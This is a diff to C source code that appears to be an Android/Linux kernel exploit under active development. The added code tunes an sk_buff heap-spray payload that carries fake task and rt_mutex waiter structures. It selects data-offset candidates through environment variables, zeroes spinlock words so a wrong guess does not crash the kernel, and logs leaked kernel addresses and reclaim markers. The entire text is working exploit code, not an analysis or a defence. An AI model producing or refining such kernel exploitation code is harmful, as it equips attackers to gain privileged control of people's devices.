@@ -47,6 +47,72 @@ uintptr_t slide_oracle_target;
 uintptr_t p0_gate_page_struct;
 uintptr_t p0_probe_page_struct;
 char ashmem_path[256] = "/dev/ashmem";
+long g_skb_data_delta = (long)SKB_DATA_DELTA;
+
+void select_skb_data_delta(void) {
+  const char *forced = getenv("SKB_DATA_DELTA");
+  if (forced && forced[0]) {
+    g_skb_data_delta = strtoll(forced, NULL, 0);
+    pr_info("skb_data_delta forced=%lld (0x%llx)\n",
+            (long long)g_skb_data_delta,
+            (unsigned long long)(uint64_t)g_skb_data_delta);
+    return;
+  }
+#if defined(SKB_DELTA_CANDIDATES)
+  static const long candidates[] = {SKB_DELTA_CANDIDATES};
+  const size_t count = sizeof(candidates) / sizeof(candidates[0]);
+  int index = 0;
+  const char *idx_env = getenv("SKB_DELTA_INDEX");
+  if (idx_env && idx_env[0]) {
+    index = atoi(idx_env);
+  }
+  if (index < 0) {
+    index = 0;
+  }
+  index = (int)((size_t)index % count);
+  g_skb_data_delta = candidates[index];
+  pr_info("skb_data_delta index=%d/%zu value=%lld (0x%llx)\n", index, count,
+          (long long)g_skb_data_delta,
+          (unsigned long long)(uint64_t)g_skb_data_delta);
+#else
+  g_skb_data_delta = (long)SKB_DATA_DELTA;
+  pr_info("skb_data_delta default=%lld (0x%llx)\n",
+          (long long)g_skb_data_delta,
+          (unsigned long long)(uint64_t)g_skb_data_delta);
+#endif
+}
+
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && defined(SLIDE_P0_OFFSET_CANDIDATES)
+/*
+ * If skb linear data starts at `base` but pointers used a wrong delta, the
+ * kernel still takes pi_lock/wait_lock at base+delta+off. Zero every candidate
+ * offset so a skew reads an unlocked qspinlock (0) instead of mm leftover
+ * garbage that BRKs in queued_spin_lock_slowpath (RWC=41).
+ */
+static void zero_lock_words_for_delta_candidates(unsigned char *p) {
+#if defined(SKB_DELTA_CANDIDATES)
+  static const long candidates[] = {SKB_DELTA_CANDIDATES};
+  for (size_t ci = 0; ci < sizeof(candidates) / sizeof(candidates[0]); ci++) {
+    for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
+      size_t task_off =
+          SLIDE_BANK_TASK_OFF + slot * SLIDE_BANK_TASK_STRIDE;
+      size_t lock_off =
+          SLIDE_BANK_LOCK_OFF + slot * SLIDE_BANK_SLOT_STRIDE;
+      long pi = candidates[ci] + (long)task_off + (long)FAKE_TASK_PI_LOCK_OFF;
+      long wl = candidates[ci] + (long)lock_off;
+      if (pi >= 0 && (size_t)pi + sizeof(uint32_t) <= ORDER3_SIZE) {
+        put32(p, (size_t)pi, 0);
+      }
+      if (wl >= 0 && (size_t)wl + sizeof(uint32_t) <= ORDER3_SIZE) {
+        put32(p, (size_t)wl, 0);
+      }
+    }
+  }
+#else
+  (void)p;
+#endif
+}
+#endif
 
 static void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                             uintptr_t tree_parent, uintptr_t tree_right,
@@ -549,7 +615,7 @@ void prepare_ctxs(void) {
 int prepare_skb_payload(uintptr_t base, int payload_mode) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
-  uintptr_t payload_base = base + SKB_DATA_DELTA;
+  uintptr_t payload_base = base + (uintptr_t)g_skb_data_delta;
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_P0_OFFSET_CANDIDATES)
@@ -557,6 +623,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     slide_bank_payload_base = payload_base;
     for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
       unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
+      /* Reclaim fingerprint (visible once any AAR exists). */
+      memcpy(p + 0x40, "RMG-SKB-RECLAIM-HIT", 19);
       memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
       for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
         uintptr_t parent;
@@ -619,7 +687,26 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
         put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
       }
+      /* Fail-safer under delta skew: unlocked qspinlock at every candidate. */
+      zero_lock_words_for_delta_candidates(p);
+      /* Re-assert primary layout wait_lock/pi_lock after safety zeros. */
+      for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
+        size_t task_off =
+            SLIDE_BANK_TASK_OFF + slot * SLIDE_BANK_TASK_STRIDE;
+        size_t lock_off =
+            SLIDE_BANK_LOCK_OFF + slot * SLIDE_BANK_SLOT_STRIDE;
+        put32(p, lock_off + 0x00, 0);
+        put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
+      }
     }
+    pr_info("slide skb payload base=%016zx payload_base=%016zx delta=%lld "
+            "gate_magic@0x%x reclaim_magic@0x40 primary_task=%016zx "
+            "primary_lock=%016zx primary_pi_lock=%016zx\n",
+            base, payload_base, (long long)g_skb_data_delta,
+            (unsigned)P0_ORACLE_GATE_PAGE_OFF,
+            payload_base + SLIDE_BANK_TASK_OFF,
+            payload_base + SLIDE_BANK_LOCK_OFF,
+            payload_base + SLIDE_BANK_TASK_OFF + FAKE_TASK_PI_LOCK_OFF);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
     return select_slide_payload_index(P0_ORACLE_GATE_SLOT);
 #else
@@ -866,11 +953,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
-  uintptr_t payload_base = base + (uintptr_t)SKB_DATA_DELTA;
+  select_skb_data_delta();
+  uintptr_t payload_base = base + (uintptr_t)g_skb_data_delta;
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu "
           "payload_base=%016zx skb_delta=%lld\n",
           leaked, base, (leaked - base) / MM_STRUCT_SZ, payload_base,
-          (long long)SKB_DATA_DELTA);
+          (long long)g_skb_data_delta);
   if (!prepare_skb_payload(base, payload_mode)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
@@ -958,9 +1046,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     reclaim_sent++;
   }
   pr_info("sk_buff reclaim sends=%d/%d mode=%d base=%016zx "
-          "payload_base=%016zx fake_lock=%016zx\n",
+          "payload_base=%016zx delta=%lld fake_lock=%016zx fake_task=%016zx "
+          "pi_lock=%016zx\n",
           reclaim_sent, reclaim_sends, payload_mode, base,
-          base + (uintptr_t)SKB_DATA_DELTA, fake_lock);
+          base + (uintptr_t)g_skb_data_delta, (long long)g_skb_data_delta,
+          fake_lock, fake_task,
+          fake_task ? fake_task + FAKE_TASK_PI_LOCK_OFF : 0);
   kernelsnitch_cleanup(ks);
   ks = NULL;
 
